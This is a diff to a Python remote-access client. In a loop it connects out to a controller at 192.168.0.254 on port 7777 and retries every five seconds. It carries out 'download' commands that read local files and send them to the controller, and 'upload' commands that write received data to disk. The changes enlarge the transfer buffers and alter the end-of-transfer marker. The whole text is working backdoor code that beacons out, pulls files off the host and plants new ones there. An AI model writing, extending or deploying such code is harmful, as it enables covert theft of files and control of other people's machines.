@@ -6,11 +6,12 @@ import time             #It's module for work time
 import socket           #It's module for work socket
 import subprocess       #It's module for work sys.command
 
+
 while True:
     while True:
         try:
             client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            client.connect(('127.0.0.1', 7777))
+            client.connect(('192.168.0.254', 7777))
             break
         except:
             time.sleep(5)
@@ -42,18 +43,25 @@ while True:
 
                 elif command[0] == 'download':
                     with open(command[1], 'rb') as file:
-                        content = file.read(2048)
-                        client.send(content)
-                        time.sleep(1)
+                        while file:
+                            content = file.read(1228800000)
 
-                    send_data('ST0P')
+                            if not content:
+                                file.close()
+                                break
+                            else:
+                                client.send(content)
+                                time.sleep(1)
+
+                    send_data('ST0P_syka_blyat')
 
                 elif command[0] == 'upload':
                     with open(command[1], 'wb') as file:
                         while True:
-                            text = client.recv(2048)
+                            text = client.recv(1228800000)
 
-                            if text == b'ST0P':
+                            if text == b'ST0P_syka_blyat':
+                                file.close()
                                 break
 
                             else:
